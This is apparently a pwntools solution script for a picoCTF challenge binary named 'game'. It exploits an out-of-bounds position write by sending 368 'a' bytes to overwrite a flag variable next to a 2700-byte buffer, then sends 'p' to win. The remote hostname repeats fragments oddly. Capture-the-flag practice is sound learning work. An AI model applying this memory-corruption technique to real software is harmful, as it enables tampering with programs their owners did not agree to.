#!/usr/bin/python3
from pwn import *

context(arch = 'i386', os = 'linux')
elf = context.binary = ELF("game")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("saturn.picosaturn.picsaturn.picoctf.net", 59563)
    else:
        return process(elf.path)

io = start()

# If you move position to 3 points (3 bytes) before the star of the game then you change the flag variable
# This variable is defined as an integer and there is a char and an int between the flag and the beginning of the
# buffer. The buffer is of size 2700. If we move the player position back 368 points from the starting point we over-
# write the flag variable with the hex value of 'a' and then we can press 'p' to instantly win the game.

str = b""
for i in range(368):
    str += b"a"

io.sendline(str)
io.sendline(b"p")
io.interactive()
